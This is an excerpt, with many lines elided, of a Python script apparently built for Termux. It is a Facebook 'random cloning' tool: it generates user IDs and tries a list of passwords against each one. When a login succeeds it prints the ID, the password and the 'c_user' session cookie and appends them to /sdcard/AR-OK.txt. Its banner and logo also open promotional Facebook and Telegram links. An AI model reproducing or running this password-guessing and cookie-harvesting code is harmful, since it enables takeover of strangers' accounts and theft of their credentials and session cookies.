...
for txxxtt in range (1000):
	...
	ugen.append(ffg)
#--------------------------(LOGO BOX)--------------------------#
os.system("espeak \"well come,to the S.K.B. termux Command Random Cloning Start Please Wait\"")
logo = ("""
...
\033[1;91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬                              
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM & 𝐂𝐄𝐎   : S.K.B-TERMUX-COMMMAND 
\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m 𝐉𝐀𝐕𝐀 & 𝐂𝐄𝐎   : ABIR- VAI 
...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Official')
...
def v2():
    ...
    os.system('xdg-open https://www.facebook.com/BCS.Bangal')
    kode = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    os.system('xdg-open https://t.me/arabir')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sAR-XD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45m[\033[38;5;42mOK-]\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            "sec-ch-ua": '"Google Chrome";v="109", "Not)A;Brand";v="8", "Chromium";v="109"',
            "sec-ch-ua-mobile": '?1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[ABIR-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                os.system("espeak \"A.R,OK, ID \"")
                open('/sdcard/AR-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            else:
                continue
